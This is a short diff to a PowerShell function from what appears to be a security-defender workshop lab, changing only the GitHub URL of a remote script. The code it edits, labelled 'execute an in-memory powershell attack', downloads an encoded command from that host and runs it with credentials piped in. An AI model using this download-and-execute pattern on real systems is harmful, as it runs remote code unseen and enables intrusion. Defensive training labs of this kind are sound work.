@@ -84,7 +84,7 @@ function ExecuteDocm()
     $password = "#PASSWORD#";
 
     #execute an in-memory powershell attack
-    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/security-defender-workshop-400/main/artifacts/day-02/Enumerate.txt"
+    $encodedCommand = Invoke-WebRequest "https://raw.githubusercontent.com/solliancenet/sentinel-defender-workshop-400/main/artifacts/day-02/Enumerate.txt"
     
     #do it...
     powershell.exe -noprofile -command $username, $password | powershell -noprofile -encodedcommand $encodedCommand;
